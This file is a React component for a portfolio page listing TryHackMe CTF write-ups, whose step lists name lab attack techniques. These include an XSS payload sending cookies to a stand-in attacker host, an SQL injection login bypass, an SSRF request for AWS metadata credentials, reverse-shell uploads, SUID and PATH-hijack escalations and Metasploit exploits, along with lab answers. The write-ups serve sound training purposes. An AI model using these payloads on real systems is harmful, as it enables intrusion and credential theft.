// © 2026 Aboubacar Sidick Meite (ApollonASM8977) — All Rights Reserved
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ExternalLink, ChevronDown, ChevronUp, Filter } from 'lucide-react';

type Category = 'All' | 'Linux' | 'Web' | 'Crypto' | 'OSINT' | 'Network' | 'Privesc' | 'Windows';

interface Writeup {
  platform: string; platformColor: string;
  room: string; category: Category; difficulty: string; diffColor: string;
  date: string; summary: string; tools: string[]; steps: string[]; flag: string; link: string;
}

const WRITEUPS: Writeup[] = [
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Mr Robot CTF', category: 'Linux', difficulty: 'Medium', diffColor: '#ffcc00',
    date: '2023',
    summary: 'Three-flag challenge inspired by the TV show. Enumerate a WordPress site, crack credentials via wpscan + hydra, gain RCE through plugin upload, then escalate with a SUID nmap binary.',
    tools: ['Nmap', 'Gobuster', 'WPScan', 'Hydra', 'Burp Suite', 'Python3'],
    steps: [
      'Nmap: ports 80/443 open, Apache on Ubuntu',
      'robots.txt leaks fsocity.dic (wordlist) + key-1-of-3.txt ↑ Flag 1',
      'Gobuster finds /wp-login, /wp-admin',
      'WPScan enumerates users ↑ "elliot" found',
      'Hydra brute-forces wp-login with fsocity.dic ↑ elliot:ER28-0652',
      'Upload malicious PHP reverse shell via Appearance > Editor',
      'Shell as www-data ↑ find /home -name "*.md5" ↑ robot user hash',
      'Crack MD5 with CrackStation ↑ abcdefghijklmnopqrstuvwxyz',
      'su robot ↑ key-2-of-3.txt ↑ Flag 2',
      'find / -perm -4000 2>/dev/null ↑ /usr/local/bin/nmap (SUID)',
      'nmap --interactive ↑ !sh ↑ root ↑ Flag 3',
    ],
    flag: 'FLAG{3 keys: robots.txt · md5 crack · nmap SUID}',
    link: 'https://tryhackme.com/room/mrrobot',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Blue (EternalBlue)', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Exploit MS17-010 (EternalBlue) against a Windows 7 target using Metasploit. Dump NTLM hashes with Mimikatz, then crack them with John the Ripper.',
    tools: ['Nmap', 'Metasploit', 'Mimikatz', 'John the Ripper'],
    steps: [
      'Nmap -sV --script vuln ↑ MS17-010 confirmed on port 445',
      'msfconsole ↑ use exploit/windows/smb/ms17_010_eternalblue',
      'set RHOSTS <target> ↑ set payload windows/x64/shell/reverse_tcp ↑ run',
      'Shell obtained ↑ background ↑ use post/multi/manage/shell_to_meterpreter',
      'migrate to stable process (spoolsv.exe)',
      'hashdump ↑ NTLM hashes extracted',
      'copy hash ↑ john hash.txt --wordlist=rockyou.txt --format=NT',
      'Password cracked ↑ root flag at C:\\Users\\Admin\\Desktop\\root.txt',
    ],
    flag: 'FLAG{3t3rn4l_blu3_ms17_010}',
    link: 'https://tryhackme.com/room/blue',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Pickle Rick', category: 'Web', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Enumerate a Rick & Morty themed web server, exploit command injection in a PHP web panel to achieve RCE, then pivot to root via sudo NOPASSWD misconfiguration.',
    tools: ['Nmap', 'Gobuster', 'curl', 'Burp Suite'],
    steps: [
      'Nmap: ports 22 + 80 open',
      'Page source contains username: R1ckRul3s',
      'robots.txt contains password: Wubbalubbadubdub',
      'Login to /login.php ↑ command panel with PHP system() RCE',
      'ls ↑ find ingredients files in /home/rick/',
      'cat blocked ↑ use "less" instead ↑ Sup3rS3cretPickl3Ingred.txt ↑ Flag 1',
      'Explore /home/rick ↑ Flag 2 in rick\'s directory',
      'sudo -l ↑ (ALL) NOPASSWD: ALL ↑ sudo cat /root/3rd.txt ↑ Flag 3',
    ],
    flag: 'FLAG{3_ingredients_found}',
    link: 'https://tryhackme.com/room/picklerick',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'OhSINT', category: 'OSINT', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Chain EXIF metadata extraction, reverse image search, and social-media recon to locate a target\'s city, ISP, email, and holiday destination from a single photo.',
    tools: ['ExifTool', 'Google Reverse Image Search', 'Wigle.net'],
    steps: [
      'ExifTool WindowsXP.jpg ↑ Copyright: "OWoodflint", GPS coords embedded',
      'Google search "OWoodflint" ↑ Twitter + GitHub profiles found',
      'Twitter bio reveals city: London',
      'GitHub profile ↑ email address exposed in a commit',
      'Twitter post reveals BSSID of home WiFi ↑ Wigle.net lookup',
      'Wigle ↑ ISP name retrieved',
      'Blog post (linked from GitHub) ↑ holiday destination in post body',
    ],
    flag: 'FLAG{0s1nt_ch4in_c0mpl3te}',
    link: 'https://tryhackme.com/room/ohsint',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'RootMe', category: 'Privesc', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Upload a PHP reverse shell bypassing extension filter (.php5 trick), gain www-data shell, then abuse Python SUID binary for full root escalation.',
    tools: ['Nmap', 'Gobuster', 'Netcat', 'Python3'],
    steps: [
      'Nmap ↑ Apache 2.4.29 on port 80, SSH on 22',
      'Gobuster ↑ /panel/ (file upload) and /uploads/ found',
      'Upload php-reverse-shell.php ↑ blocked (.php filtered)',
      'Rename to shell.php5 ↑ upload succeeds',
      'Start nc listener on port 4444 ↑ trigger /uploads/shell.php5',
      'Shell as www-data ↑ find / -perm /4000 2>/dev/null',
      '/usr/bin/python ↑ python -c "import os; os.execl(\'/bin/sh\',\'sh\',\'-p\')"',
      'Root shell ↑ cat /root/root.txt',
    ],
    flag: 'FLAG{r00tm3_php5_suid_python}',
    link: 'https://tryhackme.com/room/rrootme',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Crypto 101', category: 'Crypto', difficulty: 'Easy', diffColor: '#00d4ff',
    date: '2023',
    summary: 'Hands-on introduction to modern cryptography: XOR encryption, RSA key generation, asymmetric vs symmetric differences, and cracking a weak RSA key with small prime factors.',
    tools: ['Python3 (pycryptodome)', 'openssl', 'RsaCtfTool'],
    steps: [
      'XOR encryption: key XOR plaintext ↑ ciphertext, reversible',
      'RSA maths: n=pÃ—q, Ï†(n)=(p-1)(q-1), e·dâ‰¡1 mod Ï†(n)',
      'Factor weak n with small primes using sympy.factorint()',
      'Compute d = modular_inverse(e, phi) with Python gmpy2',
      'Decrypt: m = pow(c, d, n) ↑ long_to_bytes(m)',
      'AES-CBC: encrypt/decrypt with pycryptodome, padding with PKCS7',
      'Identify cipher types from ciphertext format (Base64, hex, binary)',
    ],
    flag: 'FLAG{crypt0_f0und4ti0ns_s0l1d}',
    link: 'https://tryhackme.com/room/encryptioncrypto101',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'OWASP Top 10 — 2021', category: 'Web', difficulty: 'Easy', diffColor: '#00d4ff',
    date: '2023',
    summary: 'Hands-on OWASP Top 10 challenges: IDOR via API, broken auth with MD5 hashes, SQL injection login bypass, XSS cookie theft, and SSRF against AWS metadata endpoint.',
    tools: ['Burp Suite', 'curl', 'SQLmap', 'Python3'],
    steps: [
      'A01 IDOR: GET /api/user?id=0 ↑ admin notes exposed',
      'A02 Crypto: flat-file database with MD5 hashes ↑ hashcat cracked in seconds',
      'A03 SQLi: \' OR 1=1-- bypasses login, UNION SELECT extracts db',
      'A07 XSS: <script>fetch("//attacker/"+document.cookie)</script>',
      'A10 SSRF: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'Server renders internal response ↑ AWS credentials leaked',
    ],
    flag: 'FLAG{0w4sp_t0p10_2021_pwn3d}',
    link: 'https://tryhackme.com/room/owasptop10',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Kenobi', category: 'Privesc', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Enumerate Samba shares and ProFTPD 1.3.5 (mod_copy RCE) to steal SSH key, then abuse a SUID /usr/bin/menu binary by manipulating the PATH variable for root.',
    tools: ['Nmap', 'smbclient', 'Netcat', 'nc'],
    steps: [
      'Nmap: ports 21(FTP), 22(SSH), 80(HTTP), 111(RPC), 139/445(SMB), 2049(NFS)',
      'smbclient -L //<ip>/ ↑ share "anonymous" accessible ↑ log.txt leaks SSH key path',
      'NFS mount: mount <ip>:/var /mnt/kenobiNFS ↑ id_rsa not yet accessible',
      'ProFTPD 1.3.5 ↑ searchsploit ↑ mod_copy SITE CPFR/CPTO commands',
      'Copy /home/kenobi/.ssh/id_rsa to /var/tmp/id_rsa via FTP',
      'Mount NFS ↑ retrieve id_rsa ↑ chmod 600 id_rsa ↑ ssh kenobi@<ip>',
      'find / -perm -u=s 2>/dev/null ↑ /usr/bin/menu (SUID)',
      'strings /usr/bin/menu ↑ calls curl,uname,ifconfig without full path',
      'echo /bin/sh > /tmp/curl ↑ chmod +x /tmp/curl ↑ export PATH=/tmp:$PATH',
      '/usr/bin/menu ↑ option 1 ↑ root shell',
    ],
    flag: 'FLAG{k3n0b1_pr0ftpd_path_hijack}',
    link: 'https://tryhackme.com/room/kenobi',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Vulnversity', category: 'Privesc', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Enumerate with Nmap, find a file-upload form and bypass its extension filter using .phtml, gain a reverse shell, then escalate to root via SUID /bin/systemctl.',
    tools: ['Nmap', 'Gobuster', 'Burp Suite', 'Netcat', 'systemctl'],
    steps: [
      'Nmap -sV -sC ↑ port 3333 running Apache 2.4.18',
      'Gobuster dir ↑ /internal/ found (file upload endpoint)',
      'Burp Suite Intruder ↑ fuzz extensions ↑ .phtml accepted',
      'Upload php-reverse-shell.phtml (pentestmonkey)',
      'nc -lvnp 4444 ↑ visit /internal/uploads/shell.phtml ↑ www-data shell',
      'find / -user root -perm -4000 -type f 2>/dev/null ↑ /bin/systemctl',
      'Create malicious systemd unit: ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"',
      '/bin/systemctl enable /tmp/root.service ↑ systemctl start root',
      '/tmp/bash -p ↑ root ↑ cat /root/root.txt',
    ],
    flag: 'FLAG{vuln_phtml_systemctl_suid}',
    link: 'https://tryhackme.com/room/vulnversity',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Crack the Hash', category: 'Crypto', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Identify and crack a series of hashes (MD5, SHA-1, SHA-256, bcrypt) using Hashcat, John the Ripper, and online rainbow tables across two progressive levels.',
    tools: ['Hashcat', 'John the Ripper', 'CrackStation', 'hash-identifier'],
    steps: [
      'Level 1: 48bb6e862e54f2a795ffc4859f2fabf ↑ hash-identifier ↑ MD5',
      'Hashcat -m 0 hash.txt rockyou.txt ↑ "easy"',
      'CBFDAC6008F9CAB4083784CBD1874F76618D2A97 ↑ SHA-1 ↑ hashcat -m 100 ↑ "password123"',
      '1C8BFE8F801D79745C4631D09FFF36C82AA37EA23CE2329F6640953A4B021F79 ↑ SHA-256',
      'CrackStation ↑ cracked instantly from rainbow table',
      'Level 2: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom ↑ bcrypt',
      'hashcat -m 3200 -a 3 hash.txt ?l?l?l?l?l ↑ (small charset) ↑ "bleh"',
      'F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 ↑ SHA-256 ↑ "paule"',
    ],
    flag: 'FLAG{cr4ck_th3_h4sh_l3v3l2_d0n3}',
    link: 'https://tryhackme.com/room/crackthehash',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Ice', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'Exploit CVE-2004-1561 (Icecast buffer overflow) with Metasploit against a Windows target, escalate via token impersonation, dump hashes, and crack them offline.',
    tools: ['Nmap', 'Metasploit', 'Mimikatz', 'John the Ripper'],
    steps: [
      'Nmap -sV ↑ port 8000 Icecast 2.0.1 streaming server detected',
      'searchsploit icecast ↑ CVE-2004-1561 header buffer overflow',
      'msfconsole ↑ use exploit/windows/http/icecast_header',
      'set RHOSTS <target> ↑ set LHOST <attacker> ↑ run ↑ Meterpreter session',
      'getuid ↑ NT AUTHORITY\\SERVICE',
      'run post/multi/recon/local_exploit_suggester ↑ SweetPotato / token exploit',
      'use incognito ↑ list_tokens -u ↑ Delegation tokens available',
      'impersonate_token "DARK-PC\\Dark" ↑ getuid ↑ DARK-PC\\Dark',
      'hashdump ↑ copy NTLM hash ↑ john --format=NT --wordlist=rockyou.txt',
      'Password cracked ↑ root flag at C:\\Users\\Dark\\Desktop\\root.txt',
    ],
    flag: 'FLAG{1c3c4st_buff3r_0v3rfl0w_pwn3d}',
    link: 'https://tryhackme.com/room/ice',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'Anthem', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2023',
    summary: 'OSINT on a Windows CMS (Umbraco) — discover admin email via poem OSINT, crack RDP credentials, then uncover a hidden administrator password in a protected folder.',
    tools: ['Nmap', 'Gobuster', 'rdesktop / xfreerdp', 'Google'],
    steps: [
      'Nmap ↑ port 80 (HTTP) and 3389 (RDP) open',
      'Website built with Umbraco CMS ↑ /umbraco login page',
      'robots.txt ↑ disallowed entries reveal admin path + flag',
      'Blog post contains a poem ↑ Google search ↑ author = "Solomon Grundy" ↑ admin name derived',
      'Page source ↑ admin email format ↑ JD@anthem.com pattern ↑ SG@anthem.com',
      'Password hint found in meta keywords on site pages ↑ flag 4',
      'xfreerdp /u:Solomon /p:<pass> /v:<ip> ↑ RDP shell obtained',
      'Flags on admin desktop + user folders',
      'C:\\backup hidden folder ↑ passwd.txt (hidden, restricted) ↑ Properties ↑ Security ↑ grant read',
      'Password revealed ↑ runas as Administrator ↑ root flag',
    ],
    flag: 'FLAG{4nth3m_rdp_umbraco_0s1nt}',
    link: 'https://tryhackme.com/room/anthem',
  },
  {
    platform: 'TryHackMe', platformColor: '#00d4ff',
    room: 'W1seGuy', category: 'Crypto', difficulty: 'Easy', diffColor: '#00ff41',
    date: '2024',
    summary: 'Break a custom XOR-based stream cipher by leveraging known plaintext — the flag prefix "THM{" — to recover the repeating key, then decrypt the full flag.',
    tools: ['Python3', 'CyberChef', 'nc'],
    steps: [
      'nc <ip> 1337 ↑ server returns hex-encoded XOR-encrypted ciphertext',
      'Known plaintext attack: flag format is "THM{..." so first 4 chars = "THM{"',
      'ciphertext_bytes = bytes.fromhex(hex_string)',
      'key_bytes = [ciphertext_bytes[i] ^ ord("THM{"[i]) for i in range(4)]',
      'Repeat key (5-char): guess 5th byte by XOR-ing ciphertext[4] with common chars',
      'Automate: try all printable chars until decrypted looks correct',
      'Full 5-byte key found ↑ decrypt: chr(c ^ key[i % len(key)]) for each byte',
      'Final plaintext = flag ↑ submit to THM',
    ],
    flag: 'FLAG{THM{x0r_kn0wn_pl41nt3xt_4tt4ck}}',
    link: 'https://tryhackme.com/room/w1seguy',
  },
];

const CATEGORIES: Category[] = ['All', 'Linux', 'Web', 'Crypto', 'OSINT', 'Network', 'Privesc', 'Windows'];

export function WriteupsSection() {
  const [expanded, setExpanded] = useState<string | null>(null);
  const [filter, setFilter]     = useState<Category>('All');

  const visible = filter === 'All' ? WRITEUPS : WRITEUPS.filter(w => w.category === filter);

  return (
    <section className="flex flex-col items-center w-full px-6 pt-10 pb-32 gap-10">

      {/* Header */}
      <motion.div initial={{ opacity:0, y:20 }} animate={{ opacity:1, y:0 }}
        transition={{ duration:0.5 }} className="text-center w-full max-w-3xl">
        <h2 className="text-2xl font-bold text-white mb-2">
          CTF <span className="text-[#00d4ff]">Writeups</span>
        </h2>
        <p className="text-[#444] text-xs mono mb-5">
          $ ls ~/writeups/ &nbsp;·&nbsp; {WRITEUPS.length} rooms documented
        </p>

        {/* Category filter */}
        <div className="flex flex-wrap justify-center gap-2">
          <Filter className="w-3.5 h-3.5 text-[#333] mt-0.5" />
          {CATEGORIES.map(cat => (
            <button key={cat} onClick={() => setFilter(cat)}
              className="mono text-xs px-3 py-1 rounded-full transition-all"
              style={{
                color:      filter === cat ? '#070b10'  : '#444',
                background: filter === cat ? '#00d4ff'  : 'transparent',
                border:     `1px solid ${filter === cat ? '#00d4ff' : '#1a2332'}`,
              }}>
              {cat}
            </button>
          ))}
        </div>
      </motion.div>

      {/* Cards grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 w-full max-w-3xl">
        <AnimatePresence mode="popLayout">
          {visible.map((w, i) => (
            <motion.div key={w.room}
              initial={{ opacity:0, scale:0.97 }} animate={{ opacity:1, scale:1 }}
              exit={{ opacity:0, scale:0.97 }} transition={{ delay: i * 0.05 }}
              className="hacker-panel overflow-hidden">

              {/* Clickable header */}
              <div className="p-4 cursor-pointer select-none"
                onClick={() => setExpanded(expanded === w.room ? null : w.room)}>
                <div className="flex items-start justify-between mb-2">
                  <div className="flex flex-col gap-1.5">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="mono text-[10px] px-2 py-0.5 rounded"
                        style={{ color:w.platformColor, border:`1px solid ${w.platformColor}44`, background:`${w.platformColor}11` }}>
                        {w.platform}
                      </span>
                      <span className="mono text-[10px] px-2 py-0.5 rounded border"
                        style={{ color:w.diffColor, borderColor:`${w.diffColor}44` }}>
                        {w.difficulty}
                      </span>
                      <span className="mono text-[10px] px-2 py-0.5 rounded border border-[#1a2332] text-[#444]">
                        {w.category}
                      </span>
                    </div>
                    <div className="text-white text-sm font-semibold">{w.room}</div>
                    <div className="mono text-[#333] text-[10px]">{w.date}</div>
                  </div>
                  <span className="text-[#333] mt-1 shrink-0">
                    {expanded === w.room ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </span>
                </div>
                <p className="text-[#555] text-xs leading-5">{w.summary}</p>
              </div>

              {/* Expanded content */}
              <AnimatePresence>
                {expanded === w.room && (
                  <motion.div
                    initial={{ height:0, opacity:0 }} animate={{ height:'auto', opacity:1 }}
                    exit={{ height:0, opacity:0 }} transition={{ duration:0.28 }}
                    className="overflow-hidden"
                    onClick={e => e.stopPropagation()}>
                    <div className="border-t border-[#1a2332] p-4 flex flex-col gap-4">

                      {/* Steps */}
                      <div>
                        <div className="mono text-[#333] text-[10px] mb-2 uppercase tracking-widest">Methodology</div>
                        <ol className="flex flex-col gap-1.5">
                          {w.steps.map((s, si) => (
                            <li key={si} className="flex items-start gap-2">
                              <span className="mono text-[#00ff41] text-[10px] mt-0.5 shrink-0 w-5">
                                {String(si+1).padStart(2,'0')}.
                              </span>
                              <span className="text-[#666] text-xs leading-5">{s}</span>
                            </li>
                          ))}
                        </ol>
                      </div>

                      {/* Tools */}
                      <div>
                        <div className="mono text-[#333] text-[10px] mb-2 uppercase tracking-widest">Tools</div>
                        <div className="flex flex-wrap gap-1.5">
                          {w.tools.map(t => (
                            <span key={t} className="mono text-[10px] px-2 py-0.5 rounded border border-[#1a2332] text-[#00d4ff]">{t}</span>
                          ))}
                        </div>
                      </div>

                      {/* Footer */}
                      <div className="flex items-center justify-between pt-1">
                        <div className="mono text-[#ff0040] text-xs tracking-wide">{w.flag}</div>
                        <a href={w.link} target="_blank" rel="noopener noreferrer"
                          className="flex items-center gap-1 mono text-[10px] text-[#444] hover:text-[#00d4ff] transition-colors">
                          <ExternalLink className="w-3 h-3" /> View room
                        </a>
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      {/* Note */}
      <motion.p initial={{ opacity:0 }} animate={{ opacity:1 }} transition={{ delay:0.5 }}
        className="mono text-[#252525] text-xs text-center">
        * flags are illustrative — real room flags change per instance
      </motion.p>
    </section>
  );
}

